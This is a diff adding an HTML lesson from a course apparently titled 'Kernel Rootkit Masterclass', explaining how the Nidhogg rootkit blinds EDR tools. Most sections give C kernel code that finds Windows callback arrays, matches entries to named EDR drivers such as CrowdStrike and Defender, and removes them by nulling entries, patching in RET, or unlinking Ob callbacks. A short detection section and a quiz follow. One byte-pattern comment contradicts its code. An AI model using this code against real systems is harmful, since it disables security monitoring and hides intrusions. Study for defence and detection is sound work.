@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 6: Kernel Callbacks & Notification Routines - Nidhogg Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F409;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#dc2626;--accent2:#b91c1c;--gradient:linear-gradient(135deg,#dc2626,#b91c1c)}</style>
+</head>
+<body>
+
+<button class="hamburger" aria-label="Toggle navigation">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>Nidhogg Course</h2>
+<span>Kernel Rootkit Masterclass</span>
+</div>
+<a class="home-link" href="../Nidhogg_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span>1. Kernel vs User-Mode</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module2.html"><span>2. Driver Basics</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module3.html"><span>3. Process &amp; Thread</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module4.html"><span>4. File &amp; Registry</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module5.html"><span>5. ETW Disabling</span><span class="diff d2">d2</span></a>
+<a class="mod-link active" href="module6.html"><span>6. Callbacks &amp; Notifications</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module7.html"><span>7. Memory Evasion</span><span class="diff d3">d3</span></a>
+<a class="mod-link" href="module8.html"><span>8. Full Chain &amp; Detection</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<span class="diff-badge med">Difficulty: Intermediate</span>
+<h1>Module 6: Kernel Callbacks &amp; Notification Routines</h1>
+<p class="subtitle">How EDR hooks into the kernel with callbacks and how Nidhogg removes them.</p>
+
+<div class="card highlight">
+<h4>Module Objective</h4>
+<p>Understand the kernel notification callback infrastructure that EDR products rely on (<code>PsSetCreateProcessNotifyRoutine</code>, <code>PsSetCreateThreadNotifyRoutine</code>, <code>PsSetLoadImageNotifyRoutine</code>, <code>ObRegisterCallbacks</code>), the internal callback arrays that store these registrations, and how Nidhogg enumerates and removes specific EDR callbacks to blind kernel-level monitoring.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>1. Why EDR Uses Kernel Callbacks</h2>
+
+<p>Modern EDR products install kernel drivers that register for notification callbacks. These callbacks provide real-time visibility into critical system events without polling:</p>
+
+<table>
+<tr><th>Callback API</th><th>Events Notified</th><th>EDR Use Case</th></tr>
+<tr><td><code>PsSetCreateProcessNotifyRoutineEx</code></td><td>Every process creation and termination</td><td>Detect suspicious process spawning (e.g., cmd.exe from Word)</td></tr>
+<tr><td><code>PsSetCreateThreadNotifyRoutine</code></td><td>Every thread creation in any process</td><td>Detect remote thread injection (CreateRemoteThread)</td></tr>
+<tr><td><code>PsSetLoadImageNotifyRoutine</code></td><td>Every image (DLL/EXE) load in any process</td><td>Detect reflective DLL loading, suspicious DLL injection</td></tr>
+<tr><td><code>ObRegisterCallbacks</code></td><td>Handle creation/duplication for processes and threads</td><td>Protect EDR processes from being terminated or injected</td></tr>
+<tr><td><code>CmRegisterCallbackEx</code></td><td>All registry operations</td><td>Detect persistence via registry (Run keys, services)</td></tr>
+</table>
+
+<p>By registering these callbacks, the EDR driver is notified synchronously for every relevant event system-wide. This is far more reliable than user-mode hooking because the callbacks fire in kernel mode before any user-mode code can interfere.</p>
+
+<!-- ============================================================ -->
+<h2>2. Process Notification Callback Internals</h2>
+
+<p>When a driver calls <code>PsSetCreateProcessNotifyRoutineEx</code>, the kernel stores the callback in an internal array. The array structure is:</p>
+
+<pre><span class="lang-tag">C</span>// Internal kernel structure (undocumented)
+// PspCreateProcessNotifyRoutine is a global array in ntoskrnl
+
+// Each element is an EX_CALLBACK_ROUTINE_BLOCK pointer (encoded)
+// The array has a fixed maximum size (64 entries on modern Windows)
+
+typedef struct _EX_CALLBACK_ROUTINE_BLOCK {
+    EX_RUNDOWN_REF  RundownProtect;   // Reference counting for safe removal
+    PEX_CALLBACK_FUNCTION Function;   // The actual callback function pointer
+    PVOID           Context;          // Driver-provided context
+} EX_CALLBACK_ROUTINE_BLOCK, *PEX_CALLBACK_ROUTINE_BLOCK;
+
+// The global array in ntoskrnl:
+// EX_CALLBACK PspCreateProcessNotifyRoutine[PSP_MAX_CREATE_PROCESS_NOTIFY];
+// Each EX_CALLBACK contains a pointer to an EX_CALLBACK_ROUTINE_BLOCK
+
+// The pointer is encoded using ExFastReference (low bits used for ref count)</pre>
+
+<div class="card">
+<h4>Encoded Pointers</h4>
+<p>The kernel stores callback pointers using <code>EX_FAST_REF</code> encoding, where the lowest 4 bits (on x64) store a reference count cache. To get the actual pointer, the low bits must be masked off: <code>actualPtr = encodedPtr &amp; ~0xF</code>. This is a common kernel optimization that Nidhogg must account for when reading the callback array.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>3. Locating the Callback Arrays</h2>
+
+<p>The callback arrays (<code>PspCreateProcessNotifyRoutine</code>, <code>PspCreateThreadNotifyRoutine</code>, <code>PspLoadImageNotifyRoutine</code>) are not exported. Nidhogg locates them by scanning known functions that reference them:</p>
+
+<pre><span class="lang-tag">C</span>PVOID FindPspCreateProcessNotifyRoutine() {
+    // Strategy: PsSetCreateProcessNotifyRoutine is EXPORTED
+    // and it references the internal array.
+
+    // 1. Get the address of the exported function
+    UNICODE_STRING funcName =
+        RTL_CONSTANT_STRING(L"PsSetCreateProcessNotifyRoutine");
+    PVOID funcAddr = MmGetSystemRoutineAddress(&funcName);
+    if (!funcAddr) return NULL;
+
+    // 2. Disassemble/scan the function for a LEA instruction
+    // that loads the address of PspCreateProcessNotifyRoutine
+    // Pattern: LEA R__, [RIP+offset]  (48 8D 0D xx xx xx xx)
+    PUCHAR scan = (PUCHAR)funcAddr;
+    for (ULONG i = 0; i < 256; i++) {
+        // Look for LEA with RIP-relative addressing
+        if (scan[i] == 0x4C && scan[i+1] == 0x8D &&
+            (scan[i+2] & 0xC7) == 0x05) {
+            // Extract RIP-relative offset
+            LONG offset = *(PLONG)(&scan[i + 3]);
+            return (PVOID)(scan + i + 7 + offset);
+        }
+    }
+    return NULL;
+}</pre>
+
+<!-- ============================================================ -->
+<h2>4. Enumerating Registered Callbacks</h2>
+
+<p>Once the array is located, Nidhogg can enumerate all registered callbacks and identify which driver registered each one:</p>
+
+<pre><span class="lang-tag">C</span>typedef struct _CALLBACK_INFO {
+    PVOID   CallbackAddress;    // The callback function address
+    PVOID   DriverBase;         // Base address of the driver that owns it
+    WCHAR   DriverName[64];     // Driver name (e.g., "CrowdStrike.sys")
+    ULONG   ArrayIndex;         // Index in the callback array
+} CALLBACK_INFO;
+
+NTSTATUS EnumerateProcessCallbacks(
+    CALLBACK_INFO* outInfo,
+    ULONG maxEntries,
+    PULONG actualCount
+) {
+    PVOID* callbackArray = FindPspCreateProcessNotifyRoutine();
+    if (!callbackArray) return STATUS_NOT_FOUND;
+
+    *actualCount = 0;
+    for (ULONG i = 0; i < 64 && *actualCount < maxEntries; i++) {
+        // Decode the EX_FAST_REF pointer
+        ULONG_PTR encoded = (ULONG_PTR)callbackArray[i];
+        ULONG_PTR decoded = encoded & ~0xF;  // Mask off ref count bits
+
+        if (decoded == 0) continue;  // Empty slot
+
+        // The decoded pointer is an EX_CALLBACK_ROUTINE_BLOCK
+        PEX_CALLBACK_ROUTINE_BLOCK block =
+            (PEX_CALLBACK_ROUTINE_BLOCK)decoded;
+
+        // Get the actual callback function pointer
+        PVOID callbackFunc = block->Function;
+
+        // Identify which driver this callback belongs to
+        CALLBACK_INFO* info = &outInfo[*actualCount];
+        info->CallbackAddress = callbackFunc;
+        info->ArrayIndex = i;
+        IdentifyDriverByAddress(callbackFunc,
+            info->DriverName, &info->DriverBase);
+
+        (*actualCount)++;
+    }
+    return STATUS_SUCCESS;
+}</pre>
+
+<!-- ============================================================ -->
+<h2>5. Identifying EDR Driver Callbacks</h2>
+
+<p>To determine which callbacks belong to which driver, Nidhogg checks which loaded module's address range contains the callback function:</p>
+
+<pre><span class="lang-tag">C</span>NTSTATUS IdentifyDriverByAddress(
+    PVOID address,
+    PWCHAR driverName,
+    PVOID* driverBase
+) {
+    // Walk PsLoadedModuleList to find which driver contains this address
+    // PsLoadedModuleList is a linked list of KLDR_DATA_TABLE_ENTRY structures
+
+    PKLDR_DATA_TABLE_ENTRY entry;
+    PLIST_ENTRY listHead = PsLoadedModuleList;  // Exported by ntoskrnl
+
+    for (PLIST_ENTRY current = listHead->Flink;
+         current != listHead;
+         current = current->Flink)
+    {
+        entry = CONTAINING_RECORD(current, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+
+        PVOID modBase = entry->DllBase;
+        PVOID modEnd  = (PUCHAR)modBase + entry->SizeOfImage;
+
+        if (address >= modBase && address < modEnd) {
+            *driverBase = modBase;
+            RtlCopyMemory(driverName, entry->BaseDllName.Buffer,
+                min(entry->BaseDllName.Length, 63 * sizeof(WCHAR)));
+            return STATUS_SUCCESS;
+        }
+    }
+
+    return STATUS_NOT_FOUND;  // Address not in any loaded module (manual-mapped?)
+}</pre>
+
+<div class="card">
+<h4>Common EDR Driver Names</h4>
+<table>
+<tr><th>EDR Product</th><th>Kernel Driver(s)</th></tr>
+<tr><td>CrowdStrike Falcon</td><td><code>csagent.sys</code>, <code>csdevicecontrol.sys</code></td></tr>
+<tr><td>Microsoft Defender</td><td><code>WdFilter.sys</code></td></tr>
+<tr><td>SentinelOne</td><td><code>SentinelMonitor.sys</code></td></tr>
+<tr><td>Carbon Black</td><td><code>cbk7.sys</code>, <code>cbsensor.sys</code></td></tr>
+<tr><td>Elastic</td><td><code>ElasticEndpoint.sys</code></td></tr>
+</table>
+</div>
+
+<!-- ============================================================ -->
+<h2>6. Removing EDR Callbacks</h2>
+
+<p>Nidhogg removes a callback by replacing its entry in the array with NULL or by patching the callback function to immediately return:</p>
+
+<pre><span class="lang-tag">C</span>// Method 1: Null out the array entry
+NTSTATUS RemoveProcessCallback(ULONG arrayIndex) {
+    PVOID* callbackArray = FindPspCreateProcessNotifyRoutine();
+    if (!callbackArray) return STATUS_NOT_FOUND;
+
+    // Atomically replace the entry with NULL
+    InterlockedExchangePointer(&callbackArray[arrayIndex], NULL);
+
+    return STATUS_SUCCESS;
+}
+
+// Method 2: Patch the callback function to RET immediately
+NTSTATUS PatchCallbackFunction(PVOID callbackAddress) {
+    // Disable write protection on the page
+    PMDL mdl = IoAllocateMdl(callbackAddress, 1, FALSE, FALSE, NULL);
+    MmProbeAndLockPages(mdl, KernelMode, IoWriteAccess);
+    PVOID mapped = MmMapLockedPagesSpecifyCache(
+        mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority
+    );
+
+    // Write a RET instruction (0xC3)
+    *(PUCHAR)mapped = 0xC3;
+
+    // Cleanup
+    MmUnmapLockedPages(mapped, mdl);
+    MmUnlockPages(mdl);
+    IoFreeMdl(mdl);
+
+    return STATUS_SUCCESS;
+}</pre>
+
+<div class="card warn">
+<h4>Method 1 vs Method 2</h4>
+<p><strong>Nulling the array entry</strong> is cleaner but can be detected by integrity checks that count registered callbacks. <strong>Patching to RET</strong> leaves the registration intact but makes the callback a no-op. Some EDR products checksum their own callback functions and detect the patch. In practice, combining both approaches and targeting specific products may be necessary.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>7. Thread and Image Load Callbacks</h2>
+
+<p>The same approach works for thread creation and image load callbacks, since they use identical internal array structures:</p>
+
+<pre><span class="lang-tag">C</span>// Thread notification callbacks
+// Stored in: PspCreateThreadNotifyRoutine (internal array)
+// Registered via: PsSetCreateThreadNotifyRoutine
+// Callback signature:
+typedef VOID (*PCREATE_THREAD_NOTIFY_ROUTINE)(
+    HANDLE ProcessId,
+    HANDLE ThreadId,
+    BOOLEAN Create  // TRUE = created, FALSE = terminated
+);
+
+// Image load notification callbacks
+// Stored in: PspLoadImageNotifyRoutine (internal array)
+// Registered via: PsSetLoadImageNotifyRoutine
+// Callback signature:
+typedef VOID (*PLOAD_IMAGE_NOTIFY_ROUTINE)(
+    PUNICODE_STRING FullImageName,
+    HANDLE ProcessId,
+    PIMAGE_INFO ImageInfo  // Contains base address, size, etc.
+);</pre>
+
+<table>
+<tr><th>Callback Type</th><th>Internal Array</th><th>Max Entries</th><th>Location Method</th></tr>
+<tr><td>Process creation</td><td><code>PspCreateProcessNotifyRoutine</code></td><td>64</td><td>Scan <code>PsSetCreateProcessNotifyRoutine</code></td></tr>
+<tr><td>Thread creation</td><td><code>PspCreateThreadNotifyRoutine</code></td><td>64</td><td>Scan <code>PsSetCreateThreadNotifyRoutine</code></td></tr>
+<tr><td>Image load</td><td><code>PspLoadImageNotifyRoutine</code></td><td>64</td><td>Scan <code>PsSetLoadImageNotifyRoutine</code></td></tr>
+</table>
+
+<!-- ============================================================ -->
+<h2>8. ObRegisterCallbacks Removal</h2>
+
+<p><code>ObRegisterCallbacks</code> registrations (used for handle protection, covered in Module 3) have a different internal structure. They are stored in callback objects attached to the <code>OBJECT_TYPE</code> structure for processes and threads:</p>
+
+<pre><span class="lang-tag">C</span>// OBJECT_TYPE contains a CALLBACK_OBJECT for ObRegisterCallbacks
+// The callback list is at OBJECT_TYPE->CallbackList
+
+// To remove an ObRegisterCallbacks registration:
+// 1. Get the OBJECT_TYPE for processes: *PsProcessType
+// 2. Walk the CallbackList linked list
+// 3. Find the entry belonging to the target EDR driver
+// 4. Unlink it from the list
+
+NTSTATUS RemoveObCallback(POBJECT_TYPE objectType, PVOID targetDriverBase) {
+    // The CallbackList is at a known offset in OBJECT_TYPE
+    PLIST_ENTRY callbackList =
+        (PLIST_ENTRY)((PUCHAR)objectType + OB_CALLBACK_LIST_OFFSET);
+
+    for (PLIST_ENTRY entry = callbackList->Flink;
+         entry != callbackList;
+         entry = entry->Flink)
+    {
+        // Each entry contains pre/post operation callback pointers
+        // Check if the callback address falls within the target driver
+        POB_CALLBACK_ENTRY cbEntry =
+            CONTAINING_RECORD(entry, OB_CALLBACK_ENTRY, CallbackList);
+
+        PVOID preOp = cbEntry->PreOperation;
+        if (IsAddressInModule(preOp, targetDriverBase)) {
+            // Unlink this callback entry
+            RemoveEntryList(entry);
+            return STATUS_SUCCESS;
+        }
+    }
+    return STATUS_NOT_FOUND;
+}</pre>
+
+<!-- ============================================================ -->
+<h2>9. Impact and Detection Considerations</h2>
+
+<p>Removing EDR callbacks has massive impact but also creates detectable artifacts:</p>
+
+<div class="card green">
+<h4>Impact of Callback Removal</h4>
+<ul>
+<li>Process creation callbacks removed: EDR cannot detect suspicious process trees or parent spoofing</li>
+<li>Thread callbacks removed: Remote thread injection goes unnoticed</li>
+<li>Image load callbacks removed: Reflective DLL injection and module stomping become invisible</li>
+<li>ObCallbacks removed: EDR's self-protection is neutralized; its process can be terminated</li>
+</ul>
+</div>
+
+<table>
+<tr><th>Detection Method</th><th>What It Checks</th></tr>
+<tr><td><strong>Callback count monitoring</strong></td><td>EDR periodically counts its registered callbacks and alerts if count decreases</td></tr>
+<tr><td><strong>Callback integrity checks</strong></td><td>EDR checksums its callback functions and detects RET patches</td></tr>
+<tr><td><strong>Kernel telemetry</strong></td><td>Some EDR products have secondary detection via minifilters, not just callbacks</td></tr>
+<tr><td><strong>Callback re-registration</strong></td><td>EDR periodically re-registers callbacks, undoing the removal</td></tr>
+<tr><td><strong>Driver verifier</strong></td><td>Integrity checking of callback arrays by anti-tamper components</td></tr>
+</table>
+
+<div class="card">
+<h4>Arms Race</h4>
+<p>Callback removal is an arms race. EDR vendors implement watchdog threads that periodically verify their callbacks are intact and re-register them if removed. A sophisticated rootkit like Nidhogg may need to run a background thread that continuously removes re-registered callbacks, creating a persistent battle between the rootkit and the EDR self-protection mechanism.</p>
+</div>
+
+<!-- ============================================================ -->
+<div class="quiz">
+<h2>Knowledge Check</h2>
+
+<div class="quiz-q" data-answer="A">
+<p>Q1: How does Nidhogg locate the PspCreateProcessNotifyRoutine internal array?</p>
+<div class="quiz-btn" data-choice="A">A) By scanning the exported PsSetCreateProcessNotifyRoutine function for a LEA instruction that references the internal array via a RIP-relative address</div>
+<div class="quiz-btn" data-choice="B">B) The array is exported directly by ntoskrnl</div>
+<div class="quiz-btn" data-choice="C">C) By reading the EPROCESS structure of the System process</div>
+<div class="quiz-btn" data-choice="D">D) Through an IOCTL to the I/O Manager</div>
+</div>
+
+<div class="quiz-q" data-answer="C">
+<p>Q2: What does EX_FAST_REF encoding mean for the callback array pointers?</p>
+<div class="quiz-btn" data-choice="A">A) The pointers are encrypted with AES</div>
+<div class="quiz-btn" data-choice="B">B) The pointers are stored as RVAs relative to ntoskrnl base</div>
+<div class="quiz-btn" data-choice="C">C) The lowest 4 bits of each pointer store a reference count cache and must be masked off to get the actual address</div>
+<div class="quiz-btn" data-choice="D">D) The pointers are XOR-encoded with a session key</div>
+</div>
+
+<div class="quiz-q" data-answer="B">
+<p>Q3: What is the main risk of nulling a callback array entry compared to patching the function to RET?</p>
+<div class="quiz-btn" data-choice="A">A) Nulling causes an immediate BSOD</div>
+<div class="quiz-btn" data-choice="B">B) Nulling is detectable by EDR integrity checks that count registered callbacks; a missing entry is obvious</div>
+<div class="quiz-btn" data-choice="C">C) Nulling permanently corrupts the array</div>
+<div class="quiz-btn" data-choice="D">D) Nulling requires kernel debugging mode</div>
+</div>
+</div>
+
+<div class="nav-btns">
+<a href="module5.html">&larr; Previous: ETW Provider Disabling</a>
+<a class="primary" href="module7.html">Next: Memory Scanner Evasion &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
